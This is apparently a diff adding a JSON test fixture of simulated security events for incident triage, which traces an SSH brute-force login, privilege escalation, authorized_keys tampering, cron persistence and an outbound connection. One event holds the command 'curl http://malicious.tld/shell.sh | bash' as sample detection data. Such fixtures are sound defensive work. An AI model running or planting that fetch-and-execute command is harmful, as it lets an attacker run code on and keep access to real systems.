@@ -1,0 +1,71 @@
+[
+  {
+    "id": "ev-001",
+    "alert_id": "alert-001",
+    "timestamp": "2026-05-23T10:00:00Z",
+    "type": "network",
+    "source": "wazuh",
+    "description": "Multiple failed SSH logins from 185.199.10.44",
+    "data": {
+      "src_ip": "185.199.10.44",
+      "dest_port": 22,
+      "count": 45
+    }
+  },
+  {
+    "id": "ev-002",
+    "alert_id": "alert-002",
+    "timestamp": "2026-05-23T10:05:00Z",
+    "type": "auth",
+    "source": "wazuh",
+    "description": "Successful SSH login for user deploy from 185.199.10.44",
+    "data": {
+      "src_ip": "185.199.10.44",
+      "user": "deploy"
+    }
+  },
+  {
+    "id": "ev-003",
+    "timestamp": "2026-05-23T10:07:00Z",
+    "type": "process",
+    "source": "elastic",
+    "description": "Sudo execution by user deploy",
+    "data": {
+      "command": "sudo su -",
+      "user": "deploy"
+    }
+  },
+  {
+    "id": "ev-004",
+    "timestamp": "2026-05-23T10:08:00Z",
+    "type": "file",
+    "source": "elastic",
+    "description": "Modified /home/deploy/.ssh/authorized_keys",
+    "data": {
+      "path": "/home/deploy/.ssh/authorized_keys",
+      "operation": "modify"
+    }
+  },
+  {
+    "id": "ev-005",
+    "timestamp": "2026-05-23T10:10:00Z",
+    "type": "persistence",
+    "source": "elastic",
+    "description": "New cron job created for user deploy",
+    "data": {
+      "command": "curl http://malicious.tld/shell.sh | bash",
+      "file": "/var/spool/cron/crontabs/deploy"
+    }
+  },
+  {
+    "id": "ev-006",
+    "timestamp": "2026-05-23T10:12:00Z",
+    "type": "network",
+    "source": "elastic",
+    "description": "Outbound connection to known malicious IP",
+    "data": {
+      "dest_ip": "91.240.118.222",
+      "dest_port": 443
+    }
+  }
+]
